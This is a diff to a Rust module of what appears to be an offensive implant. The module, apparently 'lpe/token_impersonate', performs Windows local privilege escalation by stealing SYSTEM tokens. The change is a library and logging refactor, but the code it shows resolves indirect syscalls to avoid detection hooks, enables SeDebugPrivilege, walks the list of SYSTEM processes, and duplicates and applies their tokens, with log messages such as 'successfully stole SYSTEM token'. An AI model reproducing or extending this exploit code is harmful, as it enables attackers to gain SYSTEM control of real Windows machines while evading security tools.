@@ -13,11 +13,9 @@
 //! entries are created.
 
 use anyhow::{anyhow, Context, Result};
-use winapi::um::winnt::{
-    SecurityImpersonation, TokenImpersonation, HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
-    TOKEN_QUERY,
-};
-
+use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY};
+use crate::win_types::HANDLE;
+use windows_sys::Win32::Security::TokenImpersonation;
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
 fn nt_success(status: i32) -> bool {
@@ -109,8 +107,8 @@ fn nt_close_handle(handle: u64) {
 
 /// Call `NtOpenProcess` via indirect syscall.
 unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
-    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
-    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
+    use crate::win_types::OBJECT_ATTRIBUTES;
+    use windows_sys::Win32::System::Threading::PROCESS_QUERY_LIMITED_INFORMATION;
 
     #[repr(C)]
     struct ClientId {
@@ -165,7 +163,7 @@ unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> 
 
 /// Call `NtDuplicateToken` via indirect syscall.
 unsafe fn nt_duplicate_token(existing: HANDLE, access: u32, token_type: u32) -> Result<HANDLE> {
-    use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;
+    use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;
 
     let mut new_token: HANDLE = std::ptr::null_mut();
 
@@ -234,7 +232,7 @@ unsafe fn nt_adjust_privileges_token(
     let target = match crate::syscalls::get_syscall_id("NtAdjustPrivilegesToken") {
         Ok(t) => t,
         Err(e) => {
-            log::error!("lpe/token_impersonate: failed to resolve NtAdjustPrivilegesToken SSN: {e}");
+            tracing::error!("lpe/token_impersonate: failed to resolve NtAdjustPrivilegesToken SSN: {e}");
             return -1;
         }
     };
@@ -257,7 +255,7 @@ unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            log::error!("lpe/token_impersonate: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!("lpe/token_impersonate: failed to resolve NtSetInformationThread SSN: {e}");
             return -1;
         }
     };
@@ -330,10 +328,10 @@ pub fn check_and_enable_privileges() -> Result<Vec<String>> {
         // not all requested privileges could be enabled (e.g., we only asked
         // for one, so it succeeded).
         if nt_success(status) {
-            log::info!("lpe/token_impersonate: enabled {name}");
+            tracing::info!("lpe/token_impersonate: enabled {name}");
             enabled.push(name.to_string());
         } else {
-            log::debug!(
+            tracing::debug!(
                 "lpe/token_impersonate: could not enable {name} (NTSTATUS 0x{status:08X})"
             );
         }
@@ -342,7 +340,7 @@ pub fn check_and_enable_privileges() -> Result<Vec<String>> {
     nt_close_handle(token as u64);
 
     if enabled.is_empty() {
-        log::warn!("lpe/token_impersonate: no elevated privileges could be enabled");
+        tracing::warn!("lpe/token_impersonate: no elevated privileges could be enabled");
     }
 
     Ok(enabled)
@@ -359,7 +357,7 @@ pub fn check_and_enable_privileges() -> Result<Vec<String>> {
 /// The caller is responsible for applying the token (via
 /// `NtSetInformationThread`) and closing it when done.
 pub fn exploit_token_impersonation() -> Result<HANDLE> {
-    log::info!("lpe/token_impersonate: attempting SYSTEM token theft");
+    tracing::info!("lpe/token_impersonate: attempting SYSTEM token theft");
 
     // Try to enable SeDebugPrivilege first — helps with protected processes.
     let _ = check_and_enable_privileges();
@@ -449,18 +447,18 @@ pub fn exploit_token_impersonation() -> Result<HANDLE> {
 
                 // Check if this is a target SYSTEM process.
                 if SYSTEM_TARGETS.iter().any(|t| filename == *t) {
-                    log::debug!("lpe/token_impersonate: trying {filename} (PID {pid})");
+                    tracing::debug!("lpe/token_impersonate: trying {filename} (PID {pid})");
 
                     // Try to open the process and steal its token.
                     match steal_system_token(pid) {
                         Ok(token) => {
-                            log::info!(
+                            tracing::info!(
                                 "lpe/token_impersonate: successfully stole SYSTEM token from {filename} (PID {pid})"
                             );
                             return Ok(token);
                         }
                         Err(e) => {
-                            log::debug!(
+                            tracing::debug!(
                                 "lpe/token_impersonate: failed to steal token from {filename} (PID {pid}): {e:#}"
                             );
                             // Continue trying other processes.
